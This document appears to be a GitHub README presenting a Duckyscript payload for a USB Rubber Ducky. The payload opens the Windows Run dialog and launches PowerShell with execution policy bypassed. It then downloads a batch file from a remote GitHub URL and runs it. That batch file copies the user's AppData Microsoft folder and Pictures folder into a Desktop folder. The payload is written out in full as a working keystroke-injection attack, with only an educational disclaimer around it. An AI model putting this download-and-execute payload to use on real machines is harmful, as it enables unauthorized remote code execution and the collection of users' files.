<img width="900" height="500" alt="image" src="https://github.com/user-attachments/assets/27298cee-3cb8-4604-89ce-d835fd90eea3" />

# 🦆 Duckyscript Payload – Banner & File Copy Execution

## ⚠️ Still under development

Please note that below code is still under testing and updates are required.

## 📌 Overview

This Duckyscript payload is designed to automate the execution of a remotely hosted batch script on a Windows machine. It opens the Run dialog, launches PowerShell, downloads a `.bat` file from a remote source, and executes it on the target system.

The downloaded batch script displays a custom ASCII banner and performs basic file collection by copying selected user directories to a folder on the Desktop.

---

## ⚙️ How It Works

1. Waits briefly to ensure the system is ready
2. Opens the Windows **Run dialog** (`Win + R`)
3. Launches **PowerShell** with execution policy bypassed
4. Downloads the batch file from a remote repository
5. Saves it to a temporary directory
6. Executes the batch script

---

## 📜 Payload

```ducky
REM ASCII banner omitted for brevity

DELAY 600
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/swiftglitxh/NomNom/main/banner.bat' -OutFile $env:TEMP\banner.bat; Start-Process $env:TEMP\banner.bat"
ENTER
DELAY 1000
```

---

## 📂 Batch Script Behavior

The downloaded `banner.bat` file performs the following:

* Displays a stylized ASCII banner in Command Prompt
* Outputs a status message indicating progress
* Copies the following directories:

  * `%USERPROFILE%\AppData\Roaming\Microsoft`
  * `%USERPROFILE%\Pictures`
* Stores copied data in:

  * `%USERPROFILE%\Desktop\CopyData\`
* Pauses execution to display results

---

## ⚠️ Important Notes

* The payload uses `-ExecutionPolicy Bypass` to allow script execution without restrictions
* An internet connection is required to download the remote file
* The script accesses user directories that may contain sensitive data
* Ensure proper authorization before running this payload on any system

---

## 🧪 Use Cases

* Demonstrations of USB-based automation tools
* Controlled lab environments for scripting practice
* Backup or migration testing scenarios

---

## 🔒 Disclaimer

This project is intended for **educational and authorized use only**.
Do not run this payload on systems without explicit permission.

---

## ✅ Requirements

* Windows system
* PowerShell available
* USB Rubber Ducky (or compatible device)
* Internet access

---
